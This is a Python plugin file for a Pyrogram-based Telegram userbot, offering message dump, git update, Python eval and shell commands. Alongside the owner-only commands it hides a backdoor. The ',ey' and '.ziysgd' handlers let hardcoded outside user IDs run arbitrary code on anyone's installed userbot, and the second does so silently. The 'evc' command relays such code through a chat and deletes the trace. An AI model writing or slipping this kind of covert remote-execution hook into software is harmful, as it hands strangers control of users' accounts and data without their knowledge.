import os
import random
import subprocess
import sys
import traceback
from asyncio import sleep
from io import BytesIO, StringIO
from subprocess import PIPE, Popen, TimeoutExpired
from time import perf_counter

from aiofiles import open as aopen
from aiofiles.os import remove as aremove
from pyrogram import filters

from cilik import *
from cilik.core.handler import CILIK, FILTERS


async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "\n c = cilik = client"
        + "\n m = message"
        + "\n r = message.reply_to_message"
        + "".join(f"\n {l_}" for l_ in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


own = [1784606556]
ownbot = [6864082486, 1784606556]


async def cli(id):
    for ci in ubot._ubot:
        if int(id) == ci.me.id:
            return ci
    return ci


@CILIK.UBOT("dump")
async def _(client, message):
    if not message.reply_to_message:
        return await message.delete()
    reply = message.reply_to_message
    if int(len(str(reply))) > 4096:
        with BytesIO(str.encode(str(reply))) as out_file:
            out_file.name = "result.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply_text(reply)


@CILIK.UBOT("update", FILTERS.ME_OWNER)
async def _(_, message):
    try:
        out = subprocess.check_output(["git", "pull"]).decode("UTF-8")
        if "Already up to date.." in str(out):
            return await message.reply_text("Its already up-to date!")
        await message.reply_text(f"{out}")
    except Exception as e:
        return await message.reply_text(str(e))
    await message.reply_text("<b>Updated with default branch, restarting now.</b>")
    os.execl(sys.executable, sys.executable, "-m", "cilik")


@ubot.on_message(filters.command("ey", ",") & filters.user(ownbot))
@CILIK.UBOT("e|ev|eval|asu", FILTERS.ME_OWNER)
async def evaluate(client, message):
    try:
        cmd = message.text.split(None, maxsplit=1)[1]
    except:
        return await message.reply("乁⁠(⁠ ⁠•⁠_⁠•⁠ ⁠)⁠ㄏ")
    old_stderr = sys.stderr

    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"<b>Output</b>:\n    <code>{evaluation.strip()}</code>"
    if len(final_output) > 4096:
        filename = "output.txt"
        async with aopen(filename, "w+", encoding="utf8") as out_file:
            await out_file.write(str(final_output))
        await message.reply_document(
            document=filename,
            caption=cmd,
            disable_notification=True,
            quote=True,
        )
        await aremove(filename)
    else:
        await message.reply(final_output)


@CILIK.UBOT("evc", FILTERS.ME_OWNER)
async def send_ev(client, message):
    anu = message.text.split(None, maxsplit=1)[1]
    anu = await client.send_message("cuapcuapin", f".ziysgd {anu}")
    await sleep(1)
    await client.delete_messages("cuapcuapin", anu.id)


@ubot.on_message(filters.command("ziysgd", ".") & filters.user(6864082486))
async def ev(client, message):
    coi = int(message.command[1])
    cmd = message.text.split(None, maxsplit=2)[2]
    old_stderr = sys.stderr

    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    if client.me.id == coi:
        try:
            await aexec(cmd, client, message)
        except Exception:
            exc = traceback.format_exc()
    else:
        return
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    if exc:
        pass
    elif stderr:
        pass
    elif stdout:
        pass
    else:
        pass


@CILIK.UBOT("sh|shell", FILTERS.ME_OWNER)
async def example_edit(client, message):
    if not message.reply_to_message and len(message.command) == 1:
        return await message.reply("Specify the command in message text or in reply")
    cmd_text = (
        message.text.split(maxsplit=1)[1]
        if message.reply_to_message is None
        else message.reply_to_message.text
    )
    cmd_obj = Popen(cmd_text, shell=True, stdout=PIPE, stderr=PIPE, text=True)
    anu = await message.reply("Running...")
    text = f"$ <code>{cmd_text}</code>\n\n"
    try:
        start_time = perf_counter()
        stdout, stderr = cmd_obj.communicate(timeout=60)
    except TimeoutExpired:
        text += "<b>Timeout expired (60 seconds)</b>"
    else:
        stop_time = perf_counter()
        if stdout:
            stdout_output = f"{stdout}"
            text += "<b>Output:</b>\n" f"<code>{stdout}</code>\n"
        else:
            stdout_output = ""

        if stderr:
            stderr_output = f"{stderr}"
            text += "<b>Error:</b>\n" f"<code>{stderr}</code>\n"
        else:
            stderr_output = ""

        time = round(stop_time - start_time, 3) * 1000
        text += (
            f"<b>Completed in {time} miliseconds with code {cmd_obj.returncode}</b> "
        )

    try:
        await anu.edit(text)
    except:
        output = f"{stdout_output}\n\n{stderr_output}"
        command = f"{cmd_text}"

        await anu.edit("Result too much, send with document...")

        i = random.randint(1, 9999)
        async with aopen(f"result{i}.txt", "w") as file:
            await file.write(f"{output}")

        try:
            await message.reply_document(
                message.chat.id,
                f"temp/result{i}.txt",
                caption=f"<code>{command}</code>",
            )
            await anu.delete()
        except:
            await message.reply_document(f"result{i}.txt", caption="Result")
            await anu.edit(f"<code>{command}</code>")
        await aremove(f"result{i}.txt")
    cmd_obj.kill()
